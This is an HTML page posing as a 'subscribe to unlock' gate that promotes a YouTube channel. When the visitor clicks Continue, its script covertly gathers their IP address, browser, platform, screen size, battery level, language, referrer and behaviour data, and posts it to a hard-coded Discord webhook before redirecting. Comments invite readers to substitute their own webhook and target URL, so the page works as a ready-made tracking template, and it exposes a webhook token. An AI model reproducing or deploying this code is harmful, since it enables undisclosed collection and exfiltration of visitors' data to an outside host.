<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #ffffff;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }

    button {
      background-color: #0077ff;
      color: white;
      padding: 14px 28px;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      margin: 10px;
      box-shadow: 0 0 15px #0077ff;
      transition: 0.3s;
    }

    button:hover {
      background-color: #005fcc;
    }

    #note {
      display: none;
      margin-top: 20px;
      max-width: 500px;
    }

    #timer {
      font-size: 1.5em;
      margin-top: 10px;
    }

    #continueBtn:disabled {
      background-color: #555;
      box-shadow: none;
      cursor: not-allowed;
    }
  </style>
</head>
<body>

  <h1>Subscribe to Unlock Access</h1>
  <button id="subscribeBtn">Subscribe</button>

  <div id="note">
    <p><strong>Note:</strong> You Have Subscribed - Our Channel, It Will Automatically Open Soon.<br>
    If You Unsubscribe, We Will Delete Your Whitelist User.</p>
    Now type 'Subscribe' in the box below to unlock.</p>
    <p id="timer">Please wait 5 seconds...</p>
    <button id="continueBtn" disabled>Continue</button>
  </div>

  <script>
    const subscribeBtn = document.getElementById("subscribeBtn");
    const continueBtn = document.getElementById("continueBtn");
    const note = document.getElementById("note");
    const timer = document.getElementById("timer");

    const webhookURL = "https://discord.com/api/webhooks/1381911749338464256/RzD7NHxjZy2IKqWG5xd4Jrtr2XloUjSLwDywAAypuwC8lXggNYhmNFXQ6a-uyzR_qUBp"; // Ganti dengan milikmu

    let sessionId = Math.random().toString(36).substring(2, 12);
    let startTime = Date.now();
    let mouseMoved = false;

    document.addEventListener("mousemove", () => mouseMoved = true);

    subscribeBtn.onclick = () => {
      window.open("https://youtube.com/@themugenking?si=Rwpwckc1fz7urPMP", "_blank");

      subscribeBtn.style.display = "none";
      note.style.display = "block";

      let count = 5;
      const countdown = setInterval(() => {
        count--;
        timer.innerText = `Please wait ${count} seconds...`;
        if (count <= 0) {
          clearInterval(countdown);
          timer.innerText = "You may now continue.";
          continueBtn.disabled = false;
        }
      }, 1000);
    };

    continueBtn.onclick = () => {
      const endTime = Date.now();
      const duration = Math.floor((endTime - startTime) / 1000);
      const resolution = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language;
      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const referrer = document.referrer || "None";

      navigator.getBattery().then(battery => {
        fetch("https://ipapi.co/json")
          .then(res => res.json())
          .then(ipData => {
            const payload = {
              content: "**ðŸ” Premium Access Log**",
              embeds: [{
                title: "Access Details",
                color: 0x0077ff,
                fields: [
                  { name: "IP", value: ipData.ip, inline: true },
                  { name: "Browser", value: browser, inline: false },
                  { name: "Platform", value: platform, inline: true },
                  { name: "Device", value: navigator.userAgentData?.mobile ? "Mobile" : "Desktop", inline: true },
                  { name: "Referrer", value: referrer, inline: false },
                  { name: "Resolution", value: resolution, inline: true },
                  { name: "Battery", value: (battery.level * 100) + "%", inline: true },
                  { name: "Language", value: language, inline: true },
                  { name: "Mouse Moved", value: mouseMoved ? "Yes" : "No", inline: true },
                  { name: "Duration", value: duration + " sec", inline: true },
                  { name: "Session ID", value: sessionId, inline: false },
                  { name: "Access Time", value: new Date().toLocaleString(), inline: false }
                ]
              }]
            };

            fetch(webhookURL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload)
            }).then(() => {
              window.location.href = "https://example.com/premium-content"; // Ganti dengan URL premium milikmu
            });
          });
      });
    };
  </script>

</body>
</html>
